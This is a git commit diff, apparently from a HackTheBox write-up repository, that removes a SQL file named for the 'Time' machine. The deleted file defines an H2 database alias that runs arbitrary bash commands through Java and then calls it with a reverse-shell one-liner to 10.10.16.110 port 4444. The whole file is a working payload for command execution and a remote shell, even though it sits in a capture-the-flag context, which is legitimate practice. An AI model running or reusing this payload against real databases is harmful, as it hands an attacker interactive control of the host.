9ce9de3a6d601392dc355613bbc465263dfbf4ba
oredreim <oredreim@localhost.localdomain>
2021-07-15 11:49:42 -0500

    este si

--- htb/Time/inject.sql
+++
@@ -1,6 +0,0 @@
-CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
-        String[] command = {"bash", "-c", cmd};
-        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
-        return s.hasNext() ? s.next() : "";  }
-$$;
-CALL SHELLEXEC('setsid bash -i &>/dev/tcp/10.10.16.110/4444 0>&1 &')
